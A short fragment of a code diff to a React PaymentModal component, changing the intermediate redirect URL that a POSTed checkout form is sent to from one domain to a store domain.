@@ -16,7 +16,7 @@ const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
     setIsProcessing(true);
     setTimeout(() => {
       // First redirect to an intermediate page
-      const intermediateUrl = 'https://link.securepay-redirect.com/secure-redirect';
+      const intermediateUrl = 'https://azzuraofficial.store/secure-redirect';
       
       // Create a form that POSTs to the intermediate URL
       const form = document.createElement('form');
